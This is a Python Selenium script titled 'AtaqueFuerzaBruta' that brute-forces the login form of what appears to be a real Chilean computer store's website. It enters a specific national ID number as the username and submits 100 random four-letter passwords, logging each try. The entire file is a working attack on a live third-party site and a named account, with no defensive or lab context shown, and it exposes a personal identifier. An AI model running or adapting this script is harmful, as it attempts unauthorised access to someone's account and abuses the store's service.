import time
import string
import random
from selenium import webdriver

def AtaqueFuerzaBruta():
    driver = webdriver.Chrome("D:\Reespaldo\Guias y documentos\Criptografia\chromedriver")
    driver.get("https://tienda.pc-express.cl/index.php?route=account/login")
    time.sleep(3)
    base = string.ascii_letters

    for x in range(100):
        time.sleep(2)
        user = driver.find_element_by_id("input-rut")
        user.clear()
        user.send_keys("19915591-1")
        time.sleep(1)   
        password = driver.find_element_by_id("input-password")
        password.clear()
        passRandom = ''.join(random.choice(base) for i in range(4))
        password.send_keys(passRandom)
        print("Intento numero " + str(x + 1) + ": " + str(passRandom))
        driver.find_element_by_css_selector("input[type=\"submit\" i]").click()

AtaqueFuerzaBruta()